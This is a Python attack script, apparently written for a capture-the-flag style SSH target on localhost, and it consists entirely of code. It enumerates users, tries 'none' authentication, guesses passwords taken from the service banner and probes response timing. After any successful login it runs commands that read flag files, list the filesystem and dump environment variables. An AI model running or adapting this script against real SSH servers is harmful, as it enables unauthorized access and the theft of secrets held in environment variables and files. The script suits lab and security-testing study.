import paramiko, socket, time

HOST, PORT = "127.0.0.1", 2222

def raw_banner():
    try:
        s = socket.create_connection((HOST, PORT), timeout=3)
        s.settimeout(1.5)
        data = b""
        try:
            while data.count(b"\n") < 4:
                c = s.recv(1024)
                if not c: break
                data += c
        except socket.timeout:
            pass
        s.close()
        print("RAW-BANNER:", data)
    except Exception as e:
        print("RAW-BANNER-ERR:", e)

def grab(t):
    try:
        ch = t.open_session()
        ch.exec_command("id; pwd; ls -la /; cat /flag* /root/flag* /home/*/flag* 2>/dev/null; env")
        buf = b""; end = time.time()+2
        while time.time() < end:
            if ch.recv_ready():
                buf += ch.recv(8192)
            elif ch.exit_status_ready():
                break
            time.sleep(0.02)
        print("SESSION-OUT:", buf.decode(errors="replace")[:1500])
    except Exception as e:
        print("SESSION-ERR:", type(e).__name__, str(e)[:100])

def attempt(user, pw, note):
    t0 = time.time(); status = "ERR"; info = ""; t = None
    try:
        t = paramiko.Transport((HOST, PORT))
        t.start_client(timeout=3)
        try:
            t.auth_password(user, pw)
            status = "SUCCESS"
        except paramiko.AuthenticationException:
            status = "DENIED"
        except Exception as e:
            status, info = type(e).__name__, str(e)[:90]
    except Exception as e:
        status, info = "CONN-ERR", f"{type(e).__name__}: {str(e)[:90]}"
    dt = (time.time()-t0)*1000
    print(f"{note} u={user!r} p={pw!r} -> {status} {dt:.0f}ms {info}")
    if status == "SUCCESS" and t:
        grab(t)
    if t:
        try: t.close()
        except Exception: pass

def try_none(user):
    t0 = time.time()
    try:
        t = paramiko.Transport((HOST, PORT))
        t.start_client(timeout=3)
        try:
            t.auth_none(user)
            print(f"NONE u={user!r} -> SUCCESS!!")
            grab(t)
        except paramiko.BadAuthenticationType as e:
            print(f"NONE u={user!r} -> allowed={e.allowed_types} {(time.time()-t0)*1000:.0f}ms")
        except Exception as e:
            print(f"NONE u={user!r} -> {type(e).__name__}: {str(e)[:80]}")
        try: t.close()
        except Exception: pass
    except Exception as e:
        print(f"NONE u={user!r} CONN-ERR {e}")

raw_banner()
print("== none-auth per user ==")
for u in ["audit", "root", "admin", "nosuchuser12345"]:
    try_none(u)
print("== user enumeration (fixed wrong pw) ==")
for u in ["audit", "nosuchuser12345", "root", "admin"]:
    attempt(u, "Zz9!wrong", "ENUM")
print("== banner-derived guesses ==")
for p in ["", "audit", "probe", "authorization", "Authorization", "password", "audit123"]:
    attempt("audit", p, "GUESS")
print("== length-timing check ==")
attempt("audit", "a", "TIME")
attempt("audit", "a"*36, "TIME")
print("== edge cases ==")
attempt("", "x", "EMPTYU")
attempt("nosuchuser12345", "authorization", "ANYU")
EOF

